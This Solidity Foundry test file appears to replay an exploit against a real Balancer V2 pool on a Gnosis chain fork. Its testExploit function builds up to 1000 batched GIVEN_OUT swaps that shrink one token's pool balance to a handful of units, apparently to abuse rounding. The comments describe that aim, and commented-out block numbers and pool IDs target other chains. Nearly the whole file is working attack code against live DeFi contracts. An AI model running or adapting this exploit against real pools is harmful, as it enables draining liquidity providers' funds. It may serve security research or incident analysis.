// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../basetest.sol";


interface IBalancerVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }

    struct BatchSwapStep {
        bytes32 poolId;
        uint256 assetInIndex;
        uint256 assetOutIndex;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    function batchSwap(
        SwapKind kind,
        BatchSwapStep[] memory swaps,
        address[] memory assets,
        FundManagement memory funds,
        int256[] memory limits,
        uint256 deadline
    ) external returns (int256[] memory assetDeltas);

    function getPoolTokens(bytes32 poolId)
    external
    view
    returns (
        address[] memory tokens,
        uint256[] memory balances,
        uint256 lastChangeBlock
    );
}

contract BalancerV2BatchSwapReplayTest is BaseTestWithBalanceLog {
    IBalancerVault constant vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

//    uint256 constant BLOCK_NUMBER = 23831814; // eth
//    uint256 constant BLOCK_NUMBER = 401839525; // arbitrum
//    uint256 constant BLOCK_NUMBER = 143975567; // Optimistic
    uint256 constant BLOCK_NUMBER = 43252068 ; // gnosis


//    address constant POOL_ADDR = 0x2191Df821C198600499aA1f0031b1a7514D7A7D9;
//    bytes32 constant POOL_ID = 0x2191df821c198600499aa1f0031b1a7514d7a7d9000200000000000000000639;
//    address constant POOL_ADDR = 0x1CCE5169bDe03f3d5aD0206f6BD057953539DAE6;
    bytes32 constant POOL_ID = 0x1acd5c5e69dc056649d698046486fb54545ce7e4000200000000000000000117;


    function setUp() public {
        vm.createSelectFork("https://rpc.gnosischain.com", BLOCK_NUMBER);
    }

    /* 入口：打印攻击前余额 */
    function testExploit() public balanceLog{
        (address[] memory tokens, uint256[] memory balances, uint256 lastChangeBlock) = vault.getPoolTokens(POOL_ID);

        console.log("tokens: ");
        for(uint256 i = 0; i < tokens.length; i++) {
            console.log("[%s]:", i, tokens[i]);
        }
        console.log("balances: ");
        for(uint256 i = 0; i < balances.length; i++) {
            console.log("[%s]:", i, balances[i]);
        }
        console.log("lastChangeBlock: ", lastChangeBlock);


        uint256 bal_token0 = balances[0]; // 目标是让它在 16 - 1 之间来回swap
        uint256 bal_token1 = balances[1];


        IBalancerVault.BatchSwapStep[] memory swaps = _buildSwaps_1(bal_token0, bal_token1);
        IBalancerVault.FundManagement memory funds = _buildFunds();
        int256[] memory limits = _buildLimits();


        int256[] memory assetDeltas = vault.batchSwap(
            IBalancerVault.SwapKind.GIVEN_OUT,
            swaps,
            tokens,
            funds,
            limits,
            1892156007
        );

        console.log("Asset Deltas:");
        console.logInt(assetDeltas[0]);
        console.logInt(assetDeltas[1]);
    }

    function _buildSwaps_test(uint256 bal_token0, uint256 bal_token1) internal pure returns (IBalancerVault.BatchSwapStep[] memory) {

        IBalancerVault.BatchSwapStep[] memory swaps = new IBalancerVault.BatchSwapStep[](100);
        swaps[0] = IBalancerVault.BatchSwapStep(POOL_ID, 1, 0, bal_token0  - 12868, "");
        uint256 i = 1 ;
        while(i < 100){
            swaps[i] = IBalancerVault.BatchSwapStep(POOL_ID, 1, 0, 12863 , "");
            i = i + 1;
        }
        return swaps;
    }

    function _buildSwaps_test_2(uint256 bal_token0, uint256 bal_token1) internal pure returns (IBalancerVault.BatchSwapStep[] memory) {

        IBalancerVault.BatchSwapStep[] memory swaps = new IBalancerVault.BatchSwapStep[](4);
        swaps[0] = IBalancerVault.BatchSwapStep(POOL_ID, 1, 0, bal_token0 - 14, "");
        swaps[1] = IBalancerVault.BatchSwapStep(POOL_ID, 0, 1, 269099735408709701769731 , "");
        swaps[2] = IBalancerVault.BatchSwapStep(POOL_ID, 1, 0, 3650993510, "");
        swaps[3] = IBalancerVault.BatchSwapStep(POOL_ID, 0, 1, 269099735408709701769731, "");
        return swaps;
    }

    function _buildSwaps(uint256 bal_token0, uint256 bal_token1) internal pure returns (IBalancerVault.BatchSwapStep[] memory) {
        uint256 length = 1000;
        IBalancerVault.BatchSwapStep[] memory swaps = new IBalancerVault.BatchSwapStep[](length);

        uint256 _bal_token0 = bal_token0;
        uint256 i = 0 ;
        uint256 rate = 10;
        // 目标是让它降低到 6 以内
        while(i < length){
            uint256 amountOut = _bal_token0 * rate / 100 ;
            swaps[i] = IBalancerVault.BatchSwapStep(POOL_ID, 1, 0, amountOut, "");
            i = i + 1;
            _bal_token0 -= amountOut;
        }
        return swaps;
    }

    function _buildSwaps_1(uint256 bal_token0, uint256 bal_token1) internal pure returns (IBalancerVault.BatchSwapStep[] memory) {
        uint256 length = 1000;
        IBalancerVault.BatchSwapStep[] memory swaps = new IBalancerVault.BatchSwapStep[](length);

        uint256 _bal_token1 = bal_token1;
        uint256 i = 0 ;
        uint256 rate = 10;
        // 目标是让它降低到 6 以内
        while(i < length){
            uint256 amountOut = _bal_token1 * rate / 100 ;
            swaps[i] = IBalancerVault.BatchSwapStep(POOL_ID, 0, 1, amountOut, "");
            i = i + 1;
            _bal_token1 -= amountOut;
        }
        return swaps;
    }



    function _buildFunds() internal view returns (IBalancerVault.FundManagement memory) {
        return IBalancerVault.FundManagement({
            sender: address(this),
            fromInternalBalance: true,
            recipient: payable(address(this)),
            toInternalBalance: true
        });
    }

    function _buildLimits() internal pure returns (int256[] memory) {
        int256[] memory limits = new int256[](2);
        limits[0] = type(int256).max;
        limits[1] = type(int256).max;
        return limits;
    }
}